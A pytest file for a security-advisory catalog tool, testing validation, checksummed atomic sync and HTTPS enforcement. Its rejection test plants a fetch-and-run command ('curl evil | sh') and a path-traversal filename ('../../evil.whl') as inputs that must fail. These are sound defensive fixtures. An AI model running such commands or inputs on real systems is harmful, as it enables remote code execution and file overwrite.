import copy
import hashlib
import json

import pytest

from patchwatch import catalog


def test_bundled_catalog():
    data, digest = catalog.load()
    assert len(digest) == 64
    assert data["advisories"][0]["id"] == "PW-2026-EMUDHRA"


@pytest.mark.parametrize("change", ["duplicate", "range", "fixed", "command", "extra", "traversal"])
def test_reject_invalid_catalog(tiny_catalog, change):
    d = tiny_catalog
    t = d["advisories"][0]["affected"][0]
    if change == "duplicate":
        d["advisories"].append(copy.deepcopy(d["advisories"][0]))
    elif change == "range":
        t["versions"] = "garbage"
    elif change == "fixed":
        t["fixed"] = "1.5"
    elif change == "command":
        t["command"] = "curl evil | sh"
    elif change == "extra":
        t["execute"] = True
    elif change == "traversal":
        t["artifact"] = {"filename": "../../evil.whl", "url": "https://example.com/x", "sha256": "0" * 64}
    with pytest.raises(Exception):
        catalog.validate(d)


def test_sync_is_atomic_on_invalid_data(tmp_path, monkeypatch):
    dest = tmp_path / "catalog.json"
    dest.write_text("original")
    monkeypatch.setattr(catalog, "read_url", lambda *a, **k: b'{"invalid": true}')
    with pytest.raises(Exception):
        catalog.sync("https://example.com/catalog.json", dest)
    assert dest.read_text() == "original"


def test_sync_checksum(tmp_path, tiny_catalog, monkeypatch):
    raw = json.dumps(tiny_catalog).encode()
    monkeypatch.setattr(catalog, "read_url", lambda *a, **k: raw)
    dest = tmp_path / "catalog.json"
    with pytest.raises(ValueError, match="SHA-256"):
        catalog.sync("https://example.com/catalog.json", dest, "0" * 64)
    assert not dest.exists()
    assert catalog.sync("https://example.com/catalog.json", dest, hashlib.sha256(raw).hexdigest())
    catalog.load(dest)


def test_non_https_refused():
    with pytest.raises(ValueError, match="HTTPS"):
        catalog.read_url("http://example.com/catalog.json")


def test_homebrew_dated_revision_versions():
    assert catalog.version("2026-09-25_1", "Homebrew") == catalog.Version("2026.9.25.post1")
    assert catalog.version("2026-10-20", "Homebrew") > catalog.version("2026-09-25_1", "Homebrew")
